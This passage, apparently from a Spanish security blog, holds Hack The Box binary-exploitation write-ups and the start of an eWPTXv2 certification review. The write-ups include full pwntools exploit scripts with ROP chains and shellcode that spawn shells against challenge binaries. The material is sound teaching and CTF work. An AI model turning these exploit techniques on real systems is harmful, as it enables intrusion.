fgets(user_flag,48,stdin); puts(&quot;Whoops, wrong flag!&quot;); } else { command_checker = strcmp(user_command,&quot;hof\\n&quot;); if (command_checker == 0) { puts(&quot;Register yourself for HTB Hall of Fame!&quot;); printf(&quot;Enter your name: &quot;); fgets(&amp;amp;user_name,10,stdin); puts(&quot;See you on HoF soon! :)&quot;); } else { command_checker = strcmp(user_command,&quot;ls\\n&quot;); if (command_checker == 0) { puts(&quot;- Boxes&quot;); puts(&quot;- Challenges&quot;); puts(&quot;- Endgames&quot;); puts(&quot;- Fortress&quot;); puts(&quot;- Battlegrounds&quot;); } else { command_checker = strcmp(user_command,&quot;date\\n&quot;); if (command_checker == 0) { system(&quot;date&quot;); } else { puts(&quot;Unrecognized command.&quot;); } } } } } } return;}En este punto, identificamos el buffer overflow, debido a que se establecen 16 bytes para la variable que recibe la flag del usuario, sin embargo, a través de la función fgets, vemos que esta se ha configurado para recibir 48 bytes del usuario, lo cual significa que es posible usar dicho error para sobrescribir otras áreas de la memoria.--- int command_checker; char flag [16]; /* 16 bytes */--- command_checker = strcmp(user_command,&quot;flag\\n&quot;); if (command_checker == 0) { printf(&quot;Enter flag: &quot;); fgets(flag,48,stdin); /* 48 bytes */ puts(&quot;Whoops, wrong flag!&quot;); }---En base a esta teoría, se coloca una cadena de 80 bytes en el input de la flag, lo cual genera que el programa lance un error segmentation fault, debido a que se ha logrado el desbordamiento de buffer.Posterior a esto, se genera una cadena de 100 bytes con pattern create, de gdb-gef, con el objetivo de identificar cuántos bytes debemos introducir antes de sobrescribir la dirección de retorno del programa.Habiendo hecho esto, al ejecutar el programa y colocar el patrón, detectamos que el offset corresponde a 24 bytes.Antes de continuar, es importante mencionar que el programa tiene implementado el no-execute (NX), el cual nos impide colocar código malicioso en el stack. Por lo tanto, todo lo que sea shellcode tendremos que descartarlo.Sin embargo, esto no es el fin del mundo, debido a que el programa llama a la función system a través del comando date y, por otro lado, nos permite ingresar cualquier tipo de cadena de 10 bytes con el comando hof.En base a esto, primeramente, identificamos la dirección de la llamada a la función system, con la herramienta radare2:Esto también se puede lograr con objdump:Posterior a ello, necesitamos identificar un ROP Gadget, el cual nos permitirá llamar a la función system, y pasarle un argumento, el cual necesariamente tiene que almacenarse en el registro RDI.root@offs3c:~/HTB-Console# ROPgadget --binary htb-console | grep &#39;pop rdi ; ret&#39; 0x0000000000401473 : pop rdi ; retTeniendo esto último, sólo faltaría identificar la dirección donde se almacena el valor del nombre ingresado, al usar el comando hof. Esto lo hacemos con el objetivo de escribir el argumento que vamos a pasarle a la función system. Al automatizar el ataque, en lugar de escribir sha16, escribiremos /bin/sh, lo cual nos permitirá ejecutar una shell interactiva.Como se observa en la siguiente imagen, al forzar la detención del programa, identificamos que la cadena sha16 se ha almacenado en la dirección 0x404b0.En base a esto, escribimos el siguiente exploit, el cual nos permitirá explotar el buffer overflow y obtener una shell interactiva, a partir del rop attack, el cual logramos a partir de los mismos componentes del programa.Para darles más contexto, el desbordamiento de buffer nos permite alterar el flujo del programa y llamar a la función system (0x401381), la que recibe como parámetro la cadena /bin/sh (0x404b0).Esto es posible gracias al Rop Gadget, el cual hace posible almacenar dicho argumento en el registro RDI para pasarlo a la función system, y ejecutar el comando correctamente.#!/usr/bin/python3from pwn import process, p64if __name__ == &#39;__main__&#39;: p = process(&#39;./htb-console&#39;) system_addr = 0x401381 # 0x401381 e8bafcffff call sym.imp.system POP_RDI = 0x401473 # 0x0000000000401473 : pop rdi ; ret name_addr = 0x4040b0 offset = 24 junk = b&#39;\\x41&#39; * offset payload = junk payload += p64(POP_RDI) payload += p64(name_addr) payload += p64(system_addr) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;hof&#39;) p.sendlineafter(b&#39;Enter your name: &#39;, b&#39;/bin/sh\\0&#39;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;flag&#39;) p.sendlineafter(b&#39;Enter flag: &#39;, payload) p.recv() p.interactive()Como se logra ver en imagen el exploit es ejecutado correctamente, y permite obtener la shell interactiva.Para completar el desafío, sólo debemos adaptar el exploit para que se conecte al servidor de HackTheBox con la función remote, en lugar de process:#!/usr/bin/python3from pwn import remote, p64if __name__ == &#39;__main__&#39;: p = remote(&#39;159.65.26.210&#39;, 31426) system_addr = 0x401381 # 0x401381 e8bafcffff call sym.imp.system POP_RDI = 0x401473 # 0x0000000000401473 : pop rdi ; ret name_addr = 0x4040b0 offset = 24 junk = b&#39;\\x41&#39; * offset payload = junk payload += p64(POP_RDI) payload += p64(name_addr) payload += p64(system_addr) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;hof&#39;) p.sendlineafter(b&#39;Enter your name: &#39;, b&#39;/bin/sh\\0&#39;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;flag&#39;) p.sendlineafter(b&#39;Enter flag: &#39;, payload) p.recv() p.interactive()Y ya con esto, el desafío está pwned:" }, { "title": "Reg - Pwn Challenge (HTB) ❤", "url": "/posts/Reg-HackTheBox-Pwn/", "categories": "linux, binary exploitation, htb", "tags": "linux, pwn, htb, 64-bit", "date": "2023-09-17 00:00:00 -0300", "snippet": "Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation.Este es un reto de pwning, del tipo ret2win, el cual implica explotar un Buffer Overflow con el objetivo hacer una llamado a una función que imprime la flag del desafío por pantalla.Para comenzar, primeramente realizamos un análisis general del binario, checando sus protecciones:Como se muestra en imagen, el binario es de 64 bits y posee la protección no-execute (NX), lo cual desde ya, significa que no podremos cargar código malicioso en el stack, mediante un shellcode.Hecho esto, podemos empezar a entender la función y comportamiento del programa:Al parecer es algo bastante sencillo, ya que sólo te pide el nombre y nada más.En base a esto, comenzamos jugar y en lugar de colocar un nombre de 10 bytes, metemos una string de 100 bytes:Como se muestra en imagen, el programa arroja un error segmentation fault, lo cual es más que suficiente para intuir que hemos desbordado el buffer.Sabiendo esto, analizaremos el programa un poco más a fondo, aplicando reversing con Ghidra.En la siguiente imagen, podemos observar que existe una función main la cual hace una llamada a run:int main(void){ run(); return 0;}La función run está encargada de recibir los datos del usuario por medio de la función gets, como se muestra a continuación:void run(void){ char user_name [48]; initialize(); printf(&quot;Enter your name : &quot;); gets(user_name); puts(&quot;Registered!&quot;); return;}En este punto, ya podemos identificar dónde se acontece el buffer overflow.Como se muestra en el código anterior, el programa usa la función gets para recibir el input del usuario. Dicha función es conocidamente vulnerable a ataques de desbordamiento de buffer, ya que esta no valida si el número de bytes introducidos por el usuario coinciden con aquellos que se reservaron para la variable, en base a esto el usuario puede comenzar a sobrescribir otras área de la memoria y controlar el flujo del programa:Siguiendo con Ghidra, se logra identificar una función winner la cual no es llamada desde main o run:Como se observa a continuación, el código de la función winner se encarga de imprimir el contenido del archivo flag.txt por pantalla:void winner(void){ char flag_content [1032]; FILE *flag_file; puts(&quot;Congratulations!&quot;); flag_file = fopen(&quot;flag.txt&quot;,&quot;r&quot;); fgets(flag_content,1024,flag_file); puts(flag_content); fclose(flag_file); return;}Una vez analizado todo el flujo del programa, continuamos con la detección del offset, o sea la cantidad de bytes que tenemos que meter en el overflow antes de sobrescribir la dirección de retorno.Para esto computamos una cadena 100 bytes, utilizando pattern create en gdb-gef:Al colocar esta cadena en el name provocamos que se sobrescriban los registros del programa, con lo que logramos detectar el offset correctamente:Teniendo el offset en mano, sólo nos estaría faltando identificar la ubicación de memoria de la función winner, lo cual es logrado fácilmente con la herramienta readelf:En base a todos los datos recopilados anteriormente, se construye el siguiente exploit, el cual se encarga de explotar el BoF de manera local para leer el contenido del archivo flag.txt:#!/usr/bin/env python3from pwn import process, p64if __name__ == &#39;__main__&#39;: p = process(&#39;./reg&#39;) offset = 56 junk = b&#39;\\x41&#39; * offset winner_addr = 0x401206 # winner() location # ret2win payload payload = junk payload += p64(winner_addr) p.sendlineafter(b&#39;Enter your name : &#39;, payload) p.interactive()Como se puede observar en imagen, el BoF es explotado correctamente de forma local:Para explotar el BoF de forma remota, sólo tendríamos que modificar el exploit, colocando el método remote en lugar de process, y así conectarnos al server de HTB:#!/usr/bin/env python3from pwn import remote, p64, logif __name__ == &#39;__main__&#39;: p = remote(&#39;206.189.27.45&#39;, 31721) # htb remote connection offset = 56 junk = b&#39;\\x41&#39; * offset # winner() function location winner_addr = 0x401206 # ret2win payload payload = junk payload += p64(winner_addr) # exploiting bof p.sendlineafter(b&#39;Enter your name : &#39;, payload) p.interactive()Ya ejecutando el exploit, logramos obtener la flag del desafío correctamente:References gets(7) - Linux Manual Page: https://man7.org/linux/man-pages/man3/gets.3.html" }, { "title": "Optimistic - Pwn Challenge (HTB) ❤", "url": "/posts/Optimistic-HackTheBox-Pwn/", "categories": "linux, binary exploitation, htb", "tags": "linux, pwn, htb, 64-bit", "date": "2023-09-17 00:00:00 -0300", "snippet": "Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation.En esta ocasión, les traigo la resolución de un BoF en un binario de 64-bit. El desafío como tal, consiste en un programa que simplemente te solicita datos “personales”: Correo Edad N° de caracteres que tendrá el nombre NombreComo se visualiza en imagen, el programa te exfiltra directamente una dirección de memoria, la cual por ahora desconocemos.Para empezar, es importante chequear si es que el programa cuenta con algún tipo de protección jodida de evadir:Como se puede ver no existen protecciones importantes que nos hiciesen imposible el camino de explotación.Por lo tanto, lo primero que hacemos es reversear el código con Ghidra:void main(void){ int checker_length; ssize_t user_input; uint length_user_name; undefined4 user_age; undefined2 user_email; char user_option; undefined no_option; undefined user_input_email [8]; undefined user_input_age [8]; char user_input_name [96]; initialize(); puts(&quot;Welcome to the positive community!&quot;); puts(&quot;We help you embrace optimism.&quot;); printf(&quot;Would you like to enroll yourself? (y/n): &quot;); checker_length = getchar(); user_option = (char)checker_length; getchar(); if (user_option != &#39;y&#39;) { puts(&quot;Too bad, see you next time :(&quot;); no_option = &#39;n&#39;; /* WARNING: Subroutine does not return */ exit(0); } printf(&quot;Great! Here\\&#39;s a small welcome gift: %p\\n&quot;,&amp;amp;stack0xfffffffffffffff8); puts(&quot;Please provide your details.&quot;); printf(&quot;Email: &quot;); user_input = read(0,user_input_email,8); user_email = (undefined2)user_input; printf(&quot;Age: &quot;); user_input = read(0,user_input_age,8); user_age = (undefined4)user_input; printf(&quot;Length of name: &quot;); __isoc99_scanf(&amp;amp;DAT_00102104,&amp;amp;length_user_name); if (64 &amp;lt; (int)length_user_name) { puts(&quot;Woah there! You shouldn\\&#39;t be too optimistic.&quot;); /* WARNING: Subroutine does not return */ exit(0); } printf(&quot;Name: &quot;); user_input = read(0,user_input_name,(ulong)length_user_name); length_user_name = 0; while( true ) { if ((int)user_input + -9 &amp;lt;= (int)length_user_name) { puts(&quot;Thank you! We\\&#39;ll be in touch soon.&quot;); return; } checker_length = isalpha((int)user_input_name[(int)length_user_name]); if ((checker_length == 0) &amp;amp;&amp;amp; (9 &amp;lt; (int)user_input_name[(int)length_user_name] - 0x30U)) break; length_user_name = length_user_name + 1; } puts(&quot;Sorry, that\\&#39;s an invalid name.&quot;); /* WARNING: Subroutine does not return */ exit(0);}Como se puede ver en el siguiente fragmento de código el programa solicita el tamaño en bytes que va a tener el nombre del usuario. Es curioso mencionar que la única validación que se efectúa, en este aspecto, es que el número ingresado no sea mayor a 64.printf(&quot;Length of name: &quot;);__isoc99_scanf(&amp;amp;DAT_00102104,&amp;amp;length_user_name);if (64 &amp;lt; (int)length_user_name) { puts(&quot;Woah there! You shouldn\\&#39;t be too optimistic.&quot;); /* WARNING: Subroutine does not return */ exit(0);}El nombre del usuario tiene reservado 96 bytes por lo que, en primera instancia, no podríamos generar un length mayor que nos permitiese desbordar el buffer.Otro punto importante a considerar, es que cuando el nombre del usuario es solicitado, el length de este se formatea de Integer a Unsigned Long.printf(&quot;Name: &quot;);user_input = read(0,user_input_name,(ulong)length_user_name);Considerando los dos puntos mencionados anteriormente, la conclusión es que podemos explotar un Integer Overflow: Se puede introducir un dato Integer menor a 0. El dato Integer se formatea a Unsigned Long.Para dar más contexto, los lenguajes de programación permiten definir datos de tipo Integers. Este tipo de datos tienen un límite numérico (tanto superior como inferior), el cual, si llega a ser sobrepasado, provocará que el programa entregue un resultado con un valor erróneo. Por ejemplo, en lenguaje C: el número Integer límite es 2147483647. Si nosotros tratamos de hacer un print de 2147483648, el programa entregará -2147483648, lo cual es erróneo debido a que se ha generado un overflow del entero.Otro punto a considerar es que, si nosotros formateamos un Integer con valor negativo, como -1 a Unsigned Long, este cambiará su valor al límite superior de datos Unsigned Long, que corresponde a 18446744073709551615 (0xffffffffffffffff). Esto ocurre porque los valores Unsigned siempre van del 0 en adelante (hasta su respectivo límite).Aplicando esta misma lógica en el reto, podríamos introducir un número -1 en el length del nombre, y de esta manera indicarle a la función read que asigne más de 64 bytes para el valor a almacenar en la variable user_input_name. De esta forma, aprovechamos la conversión a ulong que se ejecuta dentro de la función read.Como se puede ver a continuación, el programa acepta correctamente el length -1. Por lo tanto, hecho esto, se introduce una cadena de 150 bytes, superior al espacio asignado para la variable user_input_name, lo que causa que el programa arroje un error Segmentation fault por desbordamiento de buffer.Ahora, por ejemplo, si metemos 2147483648 en el length del nombre, también estaríamos explotando el desbordamiento de enteros, lo cual de igual forma nos permitirá desbordar el buffer del programa, ya que el espacio asignado en la función read será mayor al espacio reservado para la variable de 96 bytes donde se almacena el nombre del usuario.En la siguiente imagen, se puede ver que se ingresa el número 2147483648 en el length del nombre. Es importante recordarles que, por el Integer Overflow, este se almacenará como -2147483648, el cual posteriormente al ser convertido a Unsigned Long dará como resultado un número “erróneo” mucho mayor a 0 y a 96.Habiendo identificado la existencia del BoF, podemos proceder a debuggear el programa con la herramienta gdb-gef.Primeramente, tenemos que tratar de identificar el offset, por lo que utilizamos pattern create para generar una cadena de 150 bytes:Posterior a esto arrancamos el programa, explotamos el Integer Overflow y colocamos nuestra cadena de 150 bytes para desbordar el buffer y encontrar el offset:Como se logra ver en la imagen, el offset corresponde a 104 bytes.Antes de inyectar nuestro payload final, con el shellcode y todo, tenemos que saber la distancia que existe entre la dirección de memoria que se likea con la dirección de memoria de la variable que almacena el nombre ingresado.Este es un paso necesario, ya que necesitamos que la dirección de memoria que ingresemos en el payload apunte hacía la dirección de memoria donde se encuentre cargado nuestro shellcode, la cual corresponde justamente a la de la variable que almacena el nombre ingresado.Para esto, inyectaremos la siguiente cadena, la cual nos permitirá localizar la dirección de memoria, dependiendo de donde se encuentre la coincidencia AAAAAAAA:AAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBComo se muestra en imagen, la coincidencia es identificada con éxito en la dirección 0x7fffffffe110:De esta manera, restando la dirección de memoria likeada (0x7fffffffe170) con la identificada a partir de la cadena AAAAAAAA (0x7fffffffe110), podremos saber la localización específica de la variable user_input_name, en la memoria:Como se puede ver, el resultado indica que la dirección de memoria de la variable user_input_name se encuentra a 96 bytes de la dirección de memoria likeada, lo cual se traduce en 0x7fffffffe170 - 0x60:Antes de finalizar, existe un pequeño problema, debido a que el código que inyectemos pasará por medio de la siguiente condicional, la cual se encarga de validar que todos los caracteres introducidos en el user_input_name sean alfanuméricos.Si metemos un shellcode común y corriente, computado con MSFvenom, el programa nos arrojará el error Sorry, that&#39;s an invalid name:checker_length = isalpha((int)user_input_name[(int)length_user_name]);if ((checker_length == 0) &amp;amp;&amp;amp; (9 &amp;lt; (int)user_input_name[(int)length_user_name] - 0x30U)) break; length_user_name = length_user_name + 1;Dado esto, utilizamos el siguiente shellcode, público en ExploitDB, el cual es completamente alfanumérico y permite ejecutar una /bin/sh, de manera directa:Teniendo esto en consideración, desarrollamos el siguiente exploit, el cual nos permite explotar binario de forma local con éxito:#!/usr/bin/env python3from pwn import process, p64, logif __name__ == &#39;__main__&#39;: p = process(b&#39;./optimistic&#39;) p.sendlineafter(b&#39;Would you like to enroll yourself? (y/n): &#39;, b&#39;y&#39;) # Extracting Stack Leak p.recvuntil(b&#39;Great! Here\\&#39;s a small welcome gift: &#39;) stack_leak = p.recvline().decode() stack_leak_addr = p64(int(stack_leak, 16) - 0x60) log.info(f&quot;Stack Leaked Address: f{stack_leak}&quot;) p.sendafter(b&#39;Email: &#39;, b&#39;a&#39;) p.sendafter(b&#39;Age: &#39;, b&#39;-1&#39;) # Exploiting Integer Overflow p.sendlineafter(b&#39;Length of name: &#39;, b&#39;-1&#39;) # Shellcode offset = 104 shellcode = b&#39;XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V&#39; padding = b&#39;\\x41&#39; * (offset - len(shellcode)) payload = shellcode + padding + stack_leak_addr p.sendafter(b&#39;Name: &#39;, payload) p.interactive()Como se muestra en imagen, el exploit nos entrega una shell interactiva de forma inmediata:Para completar el desafío, sólo debemos adaptar el exploit para que se conecte al host de HackTheBox con la función remote, en lugar de process:#!/usr/bin/env python3from pwn import remote, p64, logif __name__ == &#39;__main__&#39;: p = remote(&#39;206.189.121.78&#39;, 31545) p.sendlineafter(b&#39;Would you like to enroll yourself? (y/n): &#39;, b&#39;y&#39;) # Extracting Stack Leak p.recvuntil(b&#39;Great! Here\\&#39;s a small welcome gift: &#39;) stack_leak = p.recvline().decode() stack_leak_addr = p64(int(stack_leak, 16) - 0x60) log.info(f&quot;Stack Leaked Address: f{stack_leak}&quot;) p.sendafter(b&#39;Email: &#39;, b&#39;a&#39;) p.sendafter(b&#39;Age: &#39;, b&#39;-1&#39;) # Exploiting Integer Overflow p.sendlineafter(b&#39;Length of name: &#39;, b&#39;-1&#39;) # Shellcode offset = 104 shellcode = b&#39;XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V&#39; padding = b&#39;\\x41&#39; * (offset - len(shellcode)) payload = shellcode + padding + stack_leak_addr p.sendafter(b&#39;Name: &#39;, payload) p.interactive()Y ya con esto, el desafío está pwned:References What is an Integer Overflow (Acunetix): https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/ C and C++ Integer Limits (Microsoft): https://learn.microsoft.com/es-es/cpp/c-language/cpp-integer-limits" }, { "title": "Bat Computer - Pwn Challenge (HTB) ❤", "url": "/posts/BatComputer-HackTheBox-Pwn/", "categories": "linux, binary exploitation, htb", "tags": "linux, pwn, htb, 64-bit", "date": "2023-09-10 00:00:00 -0300", "snippet": "Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation.En esta ocasión, les traigo la resolución de un BoF en un binario de 64-bit. El desafío como tal, consiste en un programa que te da dos opciones a elegir: Track Joker: Sólo imprime un texto con una dirección de memoria (0x7fffffffe1a4) que hasta ahora desconocemos. Chase Joker: Esta opción le solicita una contraseña al usuario la cual le brinda supuesto acceso al “BatMobile”.Posterior a esto procedemos a reversear el código con Ghidra donde identificamos la contraseña que el programa nos solicita.Es importante mencionar que el binario se encuentra stripped, por lo cual, en primera instancia es algo difícil de identificar los nombres de las variables y funciones:Al momento de probar la contraseña, el programa la acepta y le solicita al usuario “comandos de navegación”, los cuales al ser ingresados no tienen mucha relevancia:Luego de aplicar reversing sobre el código, ahora se logra entender más la sintaxis y el flujo principal del programa:En este punto identificamos un buffer overflow en la variable nav_command, que corresponde a los “comandos de navegación”, debido a que esta tiene asignado 76 bytes de memoria, sin embargo, al momento de leer el contenido de dicha variable con la función read esta acepta 137 bytes. Por lo cual queda toda una región de memoria disponible para sobrescribir registros.int main(void) { ... undefined nav_command [76] ... read(0,nav_command,1337); ...}Para validar esto, realizamos una prueba con la herramienta gdb-gef. Primeramente, creamos una cadena de 137 bytes. Luego arrancamos el programa y seleccionamos la opción 2, donde primero colocamos la contraseña del usuario. Posterior a esto, el programa solicita los “comandos de navegación” donde ingresamos la cadena de 137 bytes con el objetivo de sobrescribir la memoria que tiene asignada la variable nav_command, lo cual corresponde a 76 bytes. Hecho esto, el programa vuelve a solicitarle una opción al usuario, lo cual sólo ocurre porque este se encuentra en un bucle infinito. Para forzar al programa a retornar debemos colocar un número que no corresponda a 1, o 2. De esta manera, como la dirección de retorno ha sido sobrescrita, el programa arrojará un error Segmentation fault y nos permitirá validar la existencia del BoF.Al listar el offset, con la instrucción pattern offset, se identifica que se deben introducir 84 bytes para sobrescribir la dirección de retorno:Antes de crear el exploit, es importante checar las protecciones que posee el binario.Como se muestra en imagen, el programa no cuenta con NX (no-execute), ni Stack Canaries, lo cual significa que a la hora de explotar el buffer overflow podemos ejecutar código de manera arbitraria en la pila:De esta forma, empezamos creando el exploit de la siguiente manera:#!/usr/bin/python3from pwn import process, p64if __name__ == &#39;__main__&#39;: # Starting process elf = process(&#39;./batcomputer&#39;) # Extracting leaked memory address from &quot;nav_command&quot; variable elf.recvuntil(b&#39;&amp;gt; &#39;) elf.sendline(b&#39;1&#39;) result_option1 = elf.recvline().decode() nav_command_addr = p64(int(result_option1.strip(&#39;It was very hard, but Alfred managed to locate him: &#39;),16)) # Formating to x64 # msfvenom -p linux/x64/exec -f python -v shellcode -&amp;gt; shellcode shellcode = b&quot;&quot; shellcode += b&quot;\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99&quot; shellcode += b&quot;\\x50\\x54\\x5f\\x52\\x5e\\x6a\\x3b\\x58\\x0f\\x05&quot; offset = 84 # to overwrite return address padding = b&quot;\\x41&quot; * (offset - len(shellcode)) # Final payload payload = shellcode + padding + nav_command_addr # Sending password to get the input to exploit elf.recvuntil(b&#39;&amp;gt; &#39;) elf.sendline(b&#39;2&#39;) elf.recvuntil(b&#39;password: &#39;) elf.sendline(b&#39;b4tp@$$w0rd!&#39;) # Sending payload to exploit the BoF elf.recvuntil(b&#39;commands: &#39;) elf.sendline(payload) # Generating call to the overwrited return address elf.recvuntil(b&#39;&amp;gt; &#39;) elf.sendline(b&#39;3&#39;) # Getting an interactive shell elf.interactive()Al ejecutar el exploit vemos que este nos ha entregado una shell completamente interactiva, lo cual significa que nuestro shellcode se ejecutó de manera exitosa al explotar el buffer overflow:Habiendo hecho esto, podemos adaptar el exploit para explotar el desafío de HackTheBox de manera remota:#!/usr/bin/python3from argparse import ArgumentParserfrom pwn import remote, p64if __name__ == &#39;__main__&#39;: parser = ArgumentParser() parser.add_argument(&#39;--host&#39;, type=str, required=True, help=&#39;Remote host (IP/Domain)&#39;) parser.add_argument(&#39;--port&#39;, type=int, required=True, help=&#39;Remote port&#39;) args = parser.parse_args() # Starting connection connection = remote(args.host, args.port) # Extracting leaked memory address from &quot;nav_command&quot; variable connection.recvuntil(b&#39;&amp;gt; &#39;) connection.sendline(b&#39;1&#39;) result_option1 = connection.recvline().decode() nav_command_addr = p64(int(result_option1.strip(&#39;It was very hard, but Alfred managed to locate him: &#39;),16)) # Formating to x64 # msfvenom -p linux/x64/exec -f python -v shellcode shellcode = b&quot;&quot; shellcode += b&quot;\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99&quot; shellcode += b&quot;\\x50\\x54\\x5f\\x52\\x5e\\x6a\\x3b\\x58\\x0f\\x05&quot; offset = 84 # to overwrite return address padding = b&quot;\\x41&quot; * (offset - len(shellcode)) # Final payload payload = shellcode + padding + nav_command_addr # Sending password to get the input to exploit connection.recvuntil(b&#39;&amp;gt; &#39;) connection.sendline(b&#39;2&#39;) connection.recvuntil(b&#39;password: &#39;) connection.sendline(b&#39;b4tp@$$w0rd!&#39;) # Sending payload to exploit the BoF connection.recvuntil(b&#39;commands: &#39;) connection.sendline(payload) # Generating calling to the overwrited return address connection.recvuntil(b&#39;&amp;gt; &#39;) connection.sendline(b&#39;3&#39;) # Getting an interactive shell connection.interactive()Una vez ejecutado, logramos obtener una terminal interactiva en el servidor, donde podemos listar el contenido del archivo flag.txt:" }, { "title": "Mi experiencia con el eWPTXv2 🏴‍☠️", "url": "/posts/Mi-Experiencia-con-el-eWPTXv2/", "categories": "reviews, certifications, web, elearnsecurity", "tags": "reviews, certifications, web, elearnsecurity", "date": "2023-09-04 00:00:00 -0300", "snippet": "Hola a tod@s! Muchas gracias por darse el tiempo de pasarse por mi blog.Por aquí les traigo una review acerca de mi experiencia rindiendo el eWPTXv2 de eLearnSecurity.Introducción 🥂Bueno, de ante mano para quienes no sepan qué es el eWPTXv2, esta es la versión 2 (“eXtreme”) de la certificación de pentesting web de eLearnSecurity, desglosando sus siglas en eLearnSecurity WebApp Penetration Tester eXtreme version 2.Como ya muchos sabrán, el examen es totalmente práctico y tiene un valor de $400 USD, aunque para abaratar costes siempre les recomiendo mirar en la web si es que hay algún código de descuento leaked (dinero es dinero, ya saben eh).Al igual que en otros exámenes, eLearnSecurity te da 14 días para rendir el examen: 7 días para explotar el laboratorio, donde tendrás que cumplir con los 3 requisitos mínimos pero no suficientes para aprobar. Por otro lado, se te darán 7 días más para escribir un reporte profesional de vulnerabilidades, el cual tendrás que subir a la plataforma para que te evalúen.Requerimientos mínimos pero no suficientes 🗿A la hora de arrancar el examen, eLearnSecurity te una carta de engagement, donde se define el scope (3 aplicaciones web) sobre el que deberás explotar y encadenar “Xs” vulnerabilidades, con las cuales podrás lograr los 3 requisitos mínimos pero no suficientes para aprobar: Leer un archivo interno del servidor. Lograr ejecución remota de comandos mediante la explotación de un servicio interno en la máquina. Lograr ejecución remota de comandos mediante la explotación de un servicio interno en la máquina (debes explotar otra vulnerabilidad).Es importante que tengas en cuenta que son no suficientes para aprobar, por lo que te recomiendo ser bien busquilla al rendir el examen.Requisitos 🐱‍👤Bueno, los requerimientos para esta certificación examen son bastante amplios. Así que iré detallándolos uno por uno.Entender cómo funciona una aplicación web 📌Puede parecer algo tonto mencionar esto, pero créanme que no lo es. Para este examen es necesario, más bien dicho es crucial, entender bien cómo funciona una aplicación web, no pueden existir dudas básicas del tipo: cómo funcionan los procesos de autenticación, cifrado de cookies, llamadas a la base de datos, etc.Entender cómo está construida una aplicación web, tanto en el frontend como el backend, te permitirá encarar mucho mejor la certificación de cara a identificar vectores de ataque, enumeración, explotación, etc.En síntesis, es muy importante que estés pulido con los conceptos básicos de la web y el funcionamiento de las aplicaciones. Para reforzar todo esto, les recomiendo encarecidamente que se monten una aplicación web simple, ya sea en PHP, Python, o lo que quieran, y que procuren que esta cuente con mecanismos de autenticación y autorización básicos, para que logren entender por sobre todo como se conecta el backend con el frontend, cómo se consulta una base de datos, cómo funciona un procesos de autenticación, cómo se cifran las cookies, etc.Técnicas de enumeración 📌De cara al examen, es super importante que sepan emplear técnicas de enumeración ofensivas: fuzzing, volcar directorios /.git/, etc., Lo otro importante es usar el típico guessing (o pensamiento lateral) de los CTFs, en el que cualquier cosa que encuentres aquí, probablemente también la encuentres en otra ruta o en la raíz del servidor web.Por experiencia les digo que esto último se adquiere jugando con CTFs, o simplemente probando a lo loco, pero para hacerlo sencillo siempre mantengan en mente lo siguiente: lo que encuentres aquí también podría estar en este otro lugar.Entender las vulnerabilidades y saber cómo explotarlas 📌A la hora de estudiar y practicar la explotación de vulnerabilidades web, es de carácter fundamental que tengan una idea más o menos clara de cómo se origina el hallazgo en el lado del backend. Por ejemplo, si encuentran una SQLi, es casi seguro que es porque: el input del usuario está mal sanitizado en el backend, las consultas a la base de datos no están parametrizadas, etc.Con esto me refiero a que entiendan el hallazgo que tienen enfrente, cosa de saber qué tipo de técnica deben emplear o qué payload deben meter para hacer efectiva la explotación. Todo se resume en: existen múltiples formas de explotar una vulnerabilidad, pero debes entenderla para tener éxito.Para el examen de la certificación, no sirve tener una idea vaga de vulnerabilidades web, o haberlas explotado sólo 3 veces en tu vida.Para que se hagan un idea, recuerdo que ninguna de las SQLi que exploté, la encontré con el típico payload &quot; OR 1=1-- -.Saber leer código fuente 📌Desde mi punto de vista, es re importante que de cara al examen, sepas leer código fuente, mínimo: PHP, JavaScript y Python.Esto te dará un comprensión mucho mejor acerca del panorama en general de una aplicación web. Si sabes cómo leer código serás capaz de detectar un vector de ataque mucho más rápido. Lo otro es que te será mucho más fácil explotarlo, o armarte una idea de cómo hacerlo.Seguro pensarás que ChatGPT puede hacer esto, pero créeme que a veces no ☢ Lo otro, es que igual no veo mucho mérito en hacer el examen con la IA, se supone que la gracia de un examen es echar a andar la cabeza para completarlo. Con esto no digo que este mal usar IAs, pero si que tiene mucho más sentido que te la busques por tu cuenta antes que nada.La verdad, no quiero explayarme más en este punto, te aconsejo por sobre todo que estudies PHP y JavaScript, ya que es lo que principalmente se ve en el examen.Vulnerabilidades Importantes 📌No quiero dar spoilers, pero las vulnerabilidades que deben tener bien repasadas para el examen son las siguientes: SQL Injection Cross-Site Scripting (XSS) XML External Entity (XXE) Server-Side Request Forgery (SSRF) Cross-Site Request Forgery (CSRF) Server-Side Template Injection (SSTI) PHP Object Injection Java Deserialization WebApp Misconfigurations Entre otras.Recomendaciones 🏴‍☠Buenos en base a mi experiencia mis recomendaciones de cara al examen son las siguientes: Estudia y ve tranquilo, no te apures para rendir la certificación, todo a su tiempo. El examen no es fácil, es bastante busquilla de hecho, por lo tanto ríndelo cuando verdaderamente te sientas listo. Con esto no digo que esperes toda tu vida, pero si digo que tengas la seguridad suficiente de lo que sabes como para lanzarte. Existen 3 requisitos mínimos pero no suficientes para aprobar. Por experiencia yo creo que deberían ser 4: UmVwb3J0YSBtw6FzIGRlIDIgU1FMaSEgRGUgbG8gY29udHJhcmlvIHRlIHJlcHJvYmFyw6FuIDonYw== SQLi que encuentras, SQLi que reportas. Da igual si no tienes data que volcar, repórtalo igual o te reprobarán ☠ Aprende a explotar SQLi con 